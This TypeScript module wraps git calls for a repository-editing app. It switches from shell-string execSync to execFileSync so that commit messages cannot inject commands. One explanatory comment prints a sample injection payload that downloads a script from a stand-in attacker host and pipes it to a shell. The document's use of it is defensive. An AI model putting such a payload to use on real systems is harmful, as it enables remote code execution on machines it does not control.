import { execFileSync } from 'child_process'
import path from 'path'

// The repository this Studio reads and commits in. The env override exists so
// the git helpers can be driven against a scratch repository in tests; nothing
// in the app sets it.
const REPO_ROOT = process.env.BANZAMI_VS_REPO_ROOT || path.join(process.cwd(), '../..')

/**
 * Run git with an argument list, never a command string.
 *
 * This used to build `git ${args}` and hand it to execSync, which runs it
 * through a shell. gitCommit then interpolated the caller's message into it and
 * escaped double quotes, which is not enough to make a shell string safe:
 * inside double quotes a shell still expands `$(...)` and backticks, so a commit
 * message of
 *
 *     matriz actualizada $(curl -s attacker.example/x | sh)
 *
 * ran that command. The message reaches here from commitMatrix(), a Server
 * Action — an HTTP endpoint — on an app with no authentication.
 *
 * execFileSync passes argv straight to git with no shell in between, so there
 * is no string for an argument to break out of and nothing left to escape. The
 * filepath arguments are covered by the same change: `--` still separates
 * paths from revisions, but a path can no longer be read as shell syntax
 * either.
 */
/** A git invocation and whether it succeeded. */
export type GitResult = { ok: boolean; output: string }

function gitRun(args: string[]): GitResult {
  try {
    return {
      ok: true,
      output: execFileSync('git', args, {
        cwd: REPO_ROOT,
        encoding: 'utf-8',
        stdio: ['pipe', 'pipe', 'pipe'],
      }),
    }
  } catch (err: unknown) {
    const e = err as { stdout?: string; stderr?: string; message?: string }
    return { ok: false, output: e.stdout || e.stderr || e.message || String(err) }
  }
}

/** For read-only queries, where an error message reads as the answer. */
function git(args: string[]): string {
  return gitRun(args).output
}

export function gitCurrentBranch(): string {
  return git(['branch', '--show-current']).trim()
}

export function gitStatus(): string {
  return git(['status', '--short'])
}

export function gitDiff(filepath: string): string {
  return git(['diff', '--', filepath])
}

export function gitLog(n = 5): string {
  return git(['log', '--oneline', `-${Math.max(1, Math.trunc(n))}`])
}

export function gitStage(filepath: string): void {
  git(['add', '--', filepath])
}

// A commit that failed used to be reported as one that was made: git's error
// went through the same path as its output and the caller saw a string either
// way, so "commit created" appeared for a rejected hook, an empty index or a
// missing identity (A2-27). The result now carries whether git succeeded.
export function gitCommit(message: string): GitResult {
  // No escaping: the message is one argv entry and is never parsed as syntax.
  // `-m` consumes the next argv unconditionally, so even a message beginning
  // with a dash is a message and not an option.
  return gitRun(['commit', '-m', message])
}
